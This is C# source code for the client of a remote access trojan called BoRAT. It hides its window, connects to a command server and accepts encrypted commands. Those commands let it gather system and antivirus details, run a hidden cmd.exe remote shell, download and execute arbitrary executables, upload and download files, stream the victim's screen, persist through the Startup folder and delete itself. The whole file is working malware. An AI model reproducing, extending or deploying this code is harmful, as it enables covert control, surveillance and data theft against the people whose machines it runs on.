using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace NexusLabs.BoRAT.Client
{
    public partial class frmMain : Form
    {
        // Change this
        private readonly string serverList = "https://borat-admin.github.io/site/serverList.txt";
        private string encryptionKey = "B0R@t2!02@2^2%2#";

        // Networking
        private IPAddress _ip;
        private int _port, _delay;
        private Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        // File Manager
        private bool isFileUpload { get; set; }
        private int fupSize;
        private string fdl_location = "";
        private string fup_location = "";
        private byte[] receivedFile = new byte[1];
        private int writeSize;

        // Remote Shell
        private bool isStarted;
        private StreamReader readOuput, errorOutput;
        private StreamWriter writeInput;

        public static string URL;

        // Remote Desktop
        private bool isRdpStop { get; set; }

        public frmMain()
        {
            InitializeComponent();

            // Get the connection info.
            GetConnectionInfo();
        }

        private void GetConnectionInfo()
        {
            try
            {
                // Start a new webclient.
                using (WebClient client = new WebClient())
                {
                    // Download the server list as a string.
                    //var s = client.DownloadString(serverList);

                    // Split between :
                    //var list = s.Split(':');

                    // Get the IP from the first :
                    //_ip = IPAddress.Parse(list[0]);
                    // Get the port from the second :
                    //_port = Convert.ToInt32(list[1]);
                    // Get the delay from the third :
                    //_delay = Convert.ToInt32(list[2]);



                    /*
                     * 
                     * !!! MANUAL OVERRIDE FOR TESTING !!!
                     * 
                     */

                    _ip = IPAddress.Parse("127.0.0.1");
                    _port = Convert.ToInt32("40438");
                    _delay = Convert.ToInt32(5000);




                    // Debug log for saying the server has responed.
                    Debug.WriteLine("\nServer responded!\nIP: " + _ip + "\nPort: " + _port + "\nDelay: " + _delay);
                }
            }
            catch (Exception ex)
            {
                // Debug log for the internal error.
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void FrmMain_Shown(object sender, EventArgs e)
        {
            // Start a new connection on a new thread.
            Thread coreThread = new Thread(StartConnection);
            // Actually start the thread.
            coreThread.Start();
        }

        private void StartConnection()
        {
            try
            {
                while (true)
                    // Check if client is already connected.
                    if (clientSocket.Connected)
                    {
                        // Debug log saying that it has been connected.
                        Debug.WriteLine("Connected to " + _ip + " on port " + _port);

                        // Send info.
                        ReceiveInfo();
                    }
                    else
                    {
                        // Make a connection.
                        MakeConnection();
                    }
            }
            catch (Exception ex)
            {
                // Debug log for internal error.
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void ReceiveInfo()
        {
            try
            {
                byte[] buffer = new byte[1024];
                int received = 0;

                try
                {
                    // Recieve the buffer.
                    received = clientSocket.Receive(buffer);
                }
                catch (SocketException)
                {
                    // Close the socket.
                    clientSocket.Close();
                    // Create a new socket.
                    clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                    // Make a new connection.
                    MakeConnection();
                }


                if (received == 0)
                    return;

                byte[] data = new byte[received];
                Array.Copy(buffer, data, received);

                // Process a new upload request with the data.
                if (isFileUpload) ProcessUploadRequest(data);

                // Process a new normal request with the data.
                if (!isFileUpload) ProcessNormalRequest(data);
            }
            catch (Exception ex)
            {
                // Debug log for internal error.
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void MakeConnection()
        {
            try
            {
                // While the socket is disconnected.
                while (!clientSocket.Connected)
                    try
                    {
                        // Connect to the server.
                        clientSocket.Connect(Dns.GetHostAddresses(Convert.ToString(_ip)), _port);

                        // Sleep before continuing.
                        Thread.Sleep(_delay);
                    }
                    catch (SocketException)
                    {
                        // Run just in case IPs change.
                        GetConnectionInfo();
                    }
            }
            catch (Exception ex)
            {
                // Debug log for internal error.
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private string GetPublicIPAddress()
        {
            try
            {
                // Get the clients IP.
                string pubIP = new WebClient().DownloadString("https://api.ipify.org");
                return pubIP;
            }
            catch (Exception ex)
            {
                // Debug log for internal error.
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
                return "N/A";
            }
        }

        private string GetUserName()
        {
            try
            {
                // Get the username with the domain name.
                string userName = Environment.UserDomainName + @"\" + Environment.UserName;
                return userName;
            }
            catch (Exception ex)
            {
                // Debug log for internal error.
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
                return "N/A";
            }
        }

        private string GetOSName()
        {
            try
            {
                // Get the OS current version.
                RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
                // Get the OS name from the current version.
                string osName = (string)key.GetValue("productName");
                return osName;
            }
            catch (Exception ex)
            {
                // Debug log for internal error.
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
                return "N/A";
            }
        }

        private string GetSecurityName()
        {
            try
            {
                string avName = "";

                try
                {
                    // Check for the existance of anti virus.
                    string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                    ManagementObjectCollection instances = searcher.Get();

                    foreach (ManagementBaseObject instance in instances)
                    {
                        // Get the anti virus name.
                        avName = instance.GetPropertyValue("displayName").ToString();
                    }

                    if (avName.Equals(string.Empty))
                        avName = "Likely Windows Defender";
                    else if (avName == "") avName = "N/A";
                }
                catch (Exception)
                {
                    avName = "N/A";
                }

                return avName;
            }
            catch (Exception ex)
            {
                // Debug log for internal error.
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
                return "N/A";
            }
        }

        private string GetTimeDate()
        {
            try
            {
                // Get the current date and time.
                string TimeDate = DateTime.Now.ToString();
                return TimeDate;
            }
            catch (Exception ex)
            {
                // Debug log for internal error.
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
                return "N/A";
            }
        }

        private void ProcessNormalRequest(byte[] data)
        {
            try
            {
                string command = Encoding.Unicode.GetString(data);
                command = Decrypt(command);

                Debug.WriteLine(command);

                if (command.Contains("getInfo"))
                {
                    string id = command.Split('§')[1];
                    string information, pubIp, userName, osName, avName, timeDate;
                    pubIp = GetPublicIPAddress();
                    userName = GetUserName();
                    osName = GetOSName();
                    avName = GetSecurityName();
                    timeDate = GetTimeDate();

                    information = id + "§" + pubIp + "§" + userName +
                                  "§" + osName + "§" + avName + "§" +
                                  timeDate;
                    string sendInfo = "infoBack|" + information;

                    SendCommand(sendInfo);
                }

                else if (command.Equals("startCommand"))
                {
                    isStarted = true;

                    ProcessStartInfo pInfo = new ProcessStartInfo();
                    pInfo.FileName = "cmd.exe";
                    pInfo.CreateNoWindow = true;
                    pInfo.UseShellExecute = false;
                    pInfo.RedirectStandardInput = true;
                    pInfo.RedirectStandardOutput = true;
                    pInfo.RedirectStandardError = true;

                    Process p = new Process();
                    p.StartInfo = pInfo;
                    p.Start();
                    writeInput = p.StandardInput;
                    readOuput = p.StandardOutput;
                    errorOutput = p.StandardError;
                    writeInput.AutoFlush = true;

                    Thread commandShellThread = new Thread(RunCommandShellCommands);
                    commandShellThread.Start();
                }

                else if (command.StartsWith("command§"))
                {
                    if (isStarted)
                    {
                        string strCommand = command.Split('§')[1];
                        writeInput.WriteLine(strCommand + "\r\n");
                    }

                    else
                    {
                        SendError("commandFailed\n");
                    }
                }

                else if (command.StartsWith("msgBox§"))
                {
                    string[] strCommand = command.Split('§');
                    MessageBoxIcon icon = MessageBoxIcon.None;

                    if (strCommand[3] == "Information")
                    { icon = MessageBoxIcon.Information; }
                    else if (strCommand[3] == "Error")
                    { icon = MessageBoxIcon.Error; }
                    else if (strCommand[3] == "Question")
                    { icon = MessageBoxIcon.Question; }
                    else if (strCommand[3] == "Exclamation")
                    { icon = MessageBoxIcon.Exclamation; }
                    else if (strCommand[3] == "Warning")
                    { icon = MessageBoxIcon.Warning; }

                    Thread thread = new Thread(() =>
                    {
                        MessageBox.Show(strCommand[2], strCommand[1], MessageBoxButtons.OK, icon);
                    });
                    thread.Start();
                }

                else if (command.StartsWith("showImage§"))
                {
                    string[] strCommand = command.Split('§');
                    URL = strCommand[1];

                    frmImage img = new frmImage();
                    img.Show();
                }

                else if (command.StartsWith("runEXE§"))
                {
                    using (WebClient client = new WebClient())
                    {
                        string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                        char[] stringChars = new char[8];
                        Random random = new Random();

                        for (int i = 0; i < stringChars.Length; i++)
                        {
                            stringChars[i] = chars[random.Next(chars.Length)];
                        }

                        string finalString = new string(stringChars);

                        string[] strCommand = command.Split('§');

                        string file = Path.GetTempPath() + "/" + finalString + ".exe";

                        client.DownloadFile(strCommand[1], file);

                        Process.Start(file);
                    }
                }

                else if (command.Equals("drivesList"))
                {
                    string dataToSend = "drivesList§";
                    DriveInfo[] drivers = DriveInfo.GetDrives();

                    foreach (DriveInfo d in drivers)
                        try
                        {
                            if (d.IsReady)
                                dataToSend += d.Name + "|" + d.TotalSize + "\n";
                            else
                                dataToSend += d.Name + "\n";
                        }

                        catch (UnauthorizedAccessException ex)
                        {
                            SendError("FileManager Error!\n" + ex.Message);
                        }

                        catch (IOException ex)
                        {
                            SendError("FileManager Error!\n" + ex.Message);
                        }

                    SendCommand(dataToSend);
                }

                else if (command.StartsWith("enterPath§"))
                {
                    bool checkPath = false;
                    string path = command.Split('§')[1];

                    if (path.Length == 3 && path.Contains(":\\"))
                    {
                        checkPath = true;
                    }
                    else if (!checkPath && Directory.Exists(path))
                    {
                        checkPath = true;
                    }
                    else
                    {
                        SendError("Directory Not Found\n");
                        return;
                    }

                    Thread enterDir = new Thread(() => FM_EnterDirectory(path));
                    enterDir.Start();
                }

                else if (command.StartsWith("backPath§"))
                {
                    string path = command.Split('§')[1];

                    if (path.Length == 3 && path.Contains(":\\"))
                    {
                        SendCommand("backPath§driveList");
                    }
                    else
                    {
                        path = new DirectoryInfo(path).Parent.FullName;
                        SendCommand("backPath§" + path);
                    }
                }

                else if (command.StartsWith("fdl§"))
                {
                    string info = command.Split('§')[1];
                    if (File.Exists(info))
                    {
                        fdl_location = info;
                        try
                        {
                            string size = new FileInfo(info).Length.ToString();
                            SendCommand("fInfo§" + size);
                        }
                        catch (Exception ex)
                        {
                            SendError("Access Error!.\n" + ex.Message + "\n");
                        }
                    }
                    else
                    {
                        SendError("File Not Found\n");
                    }
                }

                else if (command.Equals("fdlConfirm"))
                {
                    try
                    {
                        byte[] dataToSend = File.ReadAllBytes(fdl_location);
                        SendFile(dataToSend);
                    }
                    catch (Exception ex)
                    {
                        SendError("Access Error!.\n" + ex.Message + "\n");
                    }
                }

                else if (command.StartsWith("fup§"))
                {
                    fup_location = command.Split('§')[1];
                    if (!File.Exists(fup_location))
                    {
                        fupSize = int.Parse(command.Split('§')[2]);
                        receivedFile = new byte[fupSize];
                        SendCommand("fupConfirm");
                        isFileUpload = true;
                    }
                    else
                    {
                        SendError("File Already Exists.");
                    }
                }

                else if (command.Equals("rdpStart"))
                {
                    isRdpStop = false;
                    Thread rdpThread = new Thread(StreamScreen);
                    rdpThread.Start();
                }

                else if (command.Equals("rdpStop"))
                {
                    isRdpStop = true;
                }

                else if (command.Equals("selfDestruct"))
                {
                    // Send a message back.
                    SendCommand("selfDestruct§success");

                    // Start a new command prompt to delete the file.
                    Process.Start(new ProcessStartInfo()
                    {
                        Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        FileName = "cmd.exe"
                    });

                    // Delete from startup.
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + AppDomain.CurrentDomain.FriendlyName);

                    // Quit the program.
                    Environment.Exit(1);
                }

                else if (command.Equals("addToStartup"))
                {
                    // Copy application to startup.
                    File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + AppDomain.CurrentDomain.FriendlyName);

                    // Send a message back.
                    SendCommand("addToStartup§success");

                    // Start a new command prompt to delete the file.
                    Process.Start(new ProcessStartInfo()
                    {
                        Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        FileName = "cmd.exe"
                    });

                    // Start the new one.
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + AppDomain.CurrentDomain.FriendlyName);

                    // Quit the program.
                    Environment.Exit(1);
                }
            }
            catch (Exception ex)
            {
                // Write the error to the console.
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void ProcessUploadRequest(byte[] data)
        {
            try
            {
                Buffer.BlockCopy(data, 0, receivedFile, writeSize, data.Length);

                writeSize += data.Length;

                if (receivedFile.Length == fupSize)
                {
                    try
                    {
                        using (FileStream fs = File.Create(fup_location))
                        {
                            byte[] info = receivedFile;
                            fs.Write(info, 0, info.Length);
                        }

                        Array.Clear(receivedFile, 0, receivedFile.Length);
                    }
                    catch (Exception ex)
                    {
                        SendError("File Upload Error!\n" + ex.Message + "\n");
                    }

                    SendCommand("fileReceived");
                    isFileUpload = false;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void SendCommand(string data)
        {
            try
            {
                string encrypt = Encrypt(data);
                byte[] dataToSend = Encoding.Unicode.GetBytes(encrypt);
                clientSocket.Send(dataToSend);
            }
            catch (Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }

        private void SendFile(byte[] data)
        {
            try
            {
                clientSocket.Send(data);
            }
            catch (Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }

        private void SendImage(byte[] data)
        {
            try
            {
                byte[] dataToSend = new byte[data.Length + 16];
                byte[] header = Encoding.Unicode.GetBytes("rdpImage");
                Buffer.BlockCopy(header, 0, dataToSend, 0, header.Length);
                Buffer.BlockCopy(data, 0, dataToSend, header.Length, data.Length);

                clientSocket.Send(dataToSend, 0, dataToSend.Length, SocketFlags.None);
            }
            catch (Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }

        private void SendError(string data)
        {
            try
            {
                string error = "error§" + data;
                string encrypt = Encrypt(error);
                byte[] dataToSend = Encoding.Unicode.GetBytes(encrypt);
                clientSocket.Send(dataToSend);
            }
            catch (Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }

        private void RunCommandShellCommands()
        {
            try
            {
                string tmpData = "",
                    tmpError = "",
                    strData = "",
                    strError = "";

                while ((tmpData = readOuput.ReadLine()) != null)
                {
                    strData += tmpData + "\r";
                    //send command
                    SendCommand("commandout§" + strData);
                    strData = "";
                }

                while ((tmpError = errorOutput.ReadLine()) != null)
                {
                    strError += tmpError + "\r";
                    SendCommand("commandout§" + strError);
                    strError = "";
                }
            }

            catch (Exception ex)
            {
                SendError("Command Error!\n" + ex.Message + "\n");
            }
        }

        private void FM_EnterDirectory(string path)
        {
            try
            {
                string[] directories = Directory.GetDirectories(path);
                string[] files = Directory.GetFiles(path);

                string dir = "";
                string file = "";

                foreach (string d in directories)
                {
                    string size = "N/A";
                    string name = d.Replace(path, "");
                    string creationTime = Directory.GetCreationTime(path).ToString();
                    string info = name + "|" + size + "|" + creationTime + "|" + d;
                    dir += info + "\n";
                }

                foreach (string f in files)
                {
                    string size = new FileInfo(f).Length.ToString();
                    string name = Path.GetFileName(f);
                    string creationTime = File.GetCreationTime(f).ToString();
                    string info = name + "|" + size + "|" + creationTime + "|" + f;
                    file += info + "\n";
                }

                string dataToSend = "enterPath§" + dir + file;

                SendCommand(dataToSend);
            }
            catch (ArgumentNullException)
            {
                SendError("Error in EnterPath\n");
            }
            catch (SecurityException)
            {
                SendError("Security Error in EnterPath\n");
            }
            catch (ArgumentException)
            {
                SendError("Error in EnterPath\n");
            }
            catch (UnauthorizedAccessException)
            {
                SendError("Unauthorized Error in EnterPath\n");
            }
            catch (PathTooLongException)
            {
                SendError("Error in EnterPath.\nTry Enter With Command Shell\n");
            }
            catch (NotSupportedException)
            {
                SendError("Unknown Error in EnterPath\n");
            }
        }

        private void StreamScreen()
        {
            try
            {
                while (!isRdpStop)
                {
                    ImageConverter imgConverter = new ImageConverter();
                    byte[] image = (byte[])imgConverter.ConvertTo(DesktopScreen(), typeof(byte[]));
                    SendImage(image);
                    Thread.Sleep(1000);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            // Hide straight away.
            Hide();
        }

        private Bitmap DesktopScreen()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
                Graphics graph = Graphics.FromImage(screenshot);
                graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
                return screenshot;
            }
            catch (Exception)
            {
                return null;
            }
        }

        public string Encrypt(string clearText)
        {
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (Rijndael encryptor = Rijndael.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(encryptionKey,
                    new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }

                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }

            return clearText;
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Rijndael encryptor = Rijndael.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(encryptionKey,
                        new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }

                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }

                return cipherText;
            }
            catch (Exception)
            {
                //plain text?
                return cipherText;
            }
        }
    }
}